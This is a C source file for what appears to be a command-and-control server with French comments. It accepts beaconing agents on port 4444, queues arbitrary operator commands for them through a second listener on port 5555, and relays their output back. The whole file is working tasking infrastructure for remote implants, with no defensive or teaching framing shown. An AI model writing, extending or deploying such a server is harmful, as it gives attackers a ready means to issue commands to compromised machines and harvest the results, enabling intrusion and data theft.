#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>


#define PORT_AGENTS 4444
#define PORT_CONTROLER 5555
#define MAX_CLIENTS 10

typedef struct {
    char agent_id[64];
    char task[1024];
    int has_task;
    char result[4096];
    int has_result;
} AgentSlot;

AgentSlot agents[MAX_CLIENTS];
pthread_mutex_t agents_mutex = PTHREAD_MUTEX_INITIALIZER;

int find_agent(const char *agent_id) {
    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (strcmp(agents[i].agent_id, agent_id) == 0) {
            return i;
        }
    }
    return -1;
}


int register_agent(const char *agent_id){
    int idx = find_agent(agent_id);

    if (idx >= 0)
        return idx;

    for (int i = 0; i < MAX_CLIENTS; i++) {
        if (agents[i].agent_id[0] == '\0') {
            strncpy(agents[i].agent_id, agent_id, sizeof(agents[i].agent_id) - 1);
            agents[i].has_task = 0;
            return i;
        }
    }
    return -1;
}

int handle_beacon(int client_socket, const char *agent_id) {
    pthread_mutex_lock(&agents_mutex);
    int idx = register_agent(agent_id);

    if (idx < 0) {
        pthread_mutex_unlock(&agents_mutex);
        send(client_socket, "NONE", 4, 0);
        return -1;
    }

    if (agents[idx].has_task) {
        send(client_socket, agents[idx].task, strlen(agents[idx].task), 0);
        memset(agents[idx].task, 0, sizeof(agents[idx].task));
        agents[idx].has_task = 0;
        printf("[*] Commande envoyée à l'agent %s\n", agent_id);
    } else {
        send(client_socket, "NONE", 4, 0);
    }
    pthread_mutex_unlock(&agents_mutex);
    return 0;
}

int handle_result(int client_socket, const char *agent_id, const char *result)
{
    pthread_mutex_lock(&agents_mutex);
    int idx = find_agent(agent_id);
    if (idx < 0) {
        pthread_mutex_unlock(&agents_mutex);
        send(client_socket, "UNKNOWN", 7, 0);
        return -1;
    }
    strncpy(agents[idx].result, result, sizeof(agents[idx].result) - 1);
    agents[idx].has_result = 1;
    pthread_mutex_unlock(&agents_mutex);
    return 0;
}

void *handle_agent_connection(void *arg)
{
    int client_sock = (int)(intptr_t)arg;
    char buf[2048] = {0};
    char current_agent_id[64] = {0};  // mémorise l'id de cet agent

    while (1) {
        memset(buf, 0, sizeof(buf));
        int n = recv(client_sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0)
            break;
        buf[n] = '\0';

        char type[16] = {0};
        char agent_id[64] = {0};

        if (sscanf(buf, "%15s %63s", type, agent_id) < 2)
            continue;

        if (strcmp(type, "BEACON") == 0) {
            strncpy(current_agent_id, agent_id, sizeof(current_agent_id) - 1);
            handle_beacon(client_sock, agent_id);
        } else if (strcmp(type, "RESULT") == 0) {
            char *res_start = buf + strlen("RESULT ") + strlen(agent_id) + 1;
            handle_result(client_sock, agent_id, res_start);
        }
    }

    // nettoyage à la déconnexion
    if (current_agent_id[0] != '\0') {
        pthread_mutex_lock(&agents_mutex);
        int idx = find_agent(current_agent_id);
        if (idx >= 0)
            memset(&agents[idx], 0, sizeof(AgentSlot));
        pthread_mutex_unlock(&agents_mutex);
        printf("[!] Agent %s déconnecté\n", current_agent_id);
    }

    close(client_sock);
    return NULL;
}

void handle_task_injection(int ctrl_sock, const char *buf)
{
    char agent_id[64] = {0};
    if (sscanf(buf, "TASK %63s", agent_id) < 1) {
        send(ctrl_sock, "ERROR", 5, 0);
        return;
    }
    // la commande commence après "TASK <id> "
    const char *cmd = buf + strlen("TASK ") + strlen(agent_id) + 1;

    pthread_mutex_lock(&agents_mutex);
    int idx = find_agent(agent_id);
    if (idx < 0) {
        pthread_mutex_unlock(&agents_mutex);
        send(ctrl_sock, "UNKNOWN", 7, 0);
        return;
    }
    strncpy(agents[idx].task, cmd, sizeof(agents[idx].task) - 1);
    agents[idx].has_task = 1;
    pthread_mutex_unlock(&agents_mutex);
    send(ctrl_sock, "OK", 2, 0);
}

void *listen_agents(void *arg)
{
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT_AGENTS);

    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, SOMAXCONN);
    printf("[*] En écoute agents sur le port %d\n", PORT_AGENTS);

    while (1) {
        int client = accept(srv, NULL, NULL);
        if (client < 0) continue;

        pthread_t tid;
        pthread_create(&tid, NULL, handle_agent_connection, (void*)(intptr_t)client);
        pthread_detach(tid);
    }
    return NULL;
}

void *listen_controler(void *arg)
{
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT_CONTROLER);

    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, SOMAXCONN);
    printf("[*] En écoute controler sur le port %d\n", PORT_CONTROLER);

    while (1) {
        int ctrl_sock = accept(srv, NULL, NULL);
        if (ctrl_sock < 0) continue;

        char buf[2048] = {0};
        int n = recv(ctrl_sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) {
            close(ctrl_sock);
            continue;
        }
        buf[n] = '\0';

        if (strncmp(buf, "TASK ", 5) == 0) {
            handle_task_injection(ctrl_sock, buf);
        } else if (strncmp(buf, "LIST", 4) == 0) {
            char list[2048] = {0};
            pthread_mutex_lock(&agents_mutex);
            for (int i = 0; i < MAX_CLIENTS; i++) {
                if (agents[i].agent_id[0] != '\0') {
                    strncat(list, agents[i].agent_id, sizeof(list) - strlen(list) - 1);
                    strncat(list, "\n", sizeof(list) - strlen(list) - 1);
                }
            }
            pthread_mutex_unlock(&agents_mutex);
            send(ctrl_sock, list, strlen(list), 0);
        } else if (strncmp(buf, "RESULT ", 7) == 0) {
            char agent_id[64] = {0};
            sscanf(buf, "RESULT %63s", agent_id);
            pthread_mutex_lock(&agents_mutex);
            int idx = find_agent(agent_id);
            if (idx < 0 || !agents[idx].has_result) {
                pthread_mutex_unlock(&agents_mutex);
                send(ctrl_sock, "NONE", 4, 0);
            } else {
                send(ctrl_sock, agents[idx].result, strlen(agents[idx].result), 0);
                memset(agents[idx].result, 0, sizeof(agents[idx].result));
                agents[idx].has_result = 0;
                pthread_mutex_unlock(&agents_mutex);
            }
        } else {
            send(ctrl_sock, "UNKNOWN", 7, 0);
        }
        close(ctrl_sock);
    }
    return NULL;
}

int main(){
    memset(agents, 0, sizeof(agents));
    pthread_t t_agents, t_ctrl;

    pthread_create(&t_agents, NULL, listen_agents, NULL);
    pthread_create(&t_ctrl, NULL, listen_controler, NULL);

    pthread_join(t_agents, NULL);
    pthread_join(t_ctrl, NULL);

    return 0;
}